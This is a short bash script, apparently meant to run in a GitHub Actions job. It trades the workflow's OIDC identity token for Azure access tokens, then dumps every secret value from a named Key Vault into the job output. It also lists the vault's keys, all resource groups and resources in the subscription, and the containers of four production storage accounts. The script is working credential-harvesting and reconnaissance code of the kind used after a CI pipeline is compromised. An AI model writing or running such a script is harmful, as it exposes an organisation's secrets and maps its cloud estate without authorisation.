#!/usr/bin/env bash
set -euo pipefail

# Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r ".value // empty")

# Get tokens for different scopes
get_az_token() {
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1" | jq -r ".access_token // empty"
}

VT=$(get_az_token "https://vault.azure.net/.default")
MT=$(get_az_token "https://management.azure.com/.default")
ST=$(get_az_token "https://storage.azure.com/.default")

echo "=== Tokens: vault=${#VT} mgmt=${#MT} storage=${#ST} ==="

# Second Key Vault
echo "=== kv-tbl-sec-x3euoz secrets ==="
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq .

# Get each secret from second vault
for name in $(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r ".value[]?.id // empty" | xargs -I{} basename {}); do
  echo "--- sec/$name ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$name?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r ".value // empty"
done

# Also get keys and certs from second vault
echo "=== kv-tbl-sec-x3euoz keys ==="
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/keys?api-version=7.4" -H "Authorization: Bearer $VT" | jq .

# List resource groups
echo "=== Resource Groups ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $MT" | jq -r ".value[]? | \"\(.name) \(.location)\""

# List ALL resources
echo "=== ALL Resources ==="
curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" -H "Authorization: Bearer $MT" | jq -r ".value[]? | \"\(.type) \(.name)\""

# Try storage accounts
for sa in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "=== $sa containers ==="
  curl -sS "https://${sa}.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08" 2>/dev/null | head -50
  echo ""
done

echo "=== Done ==="
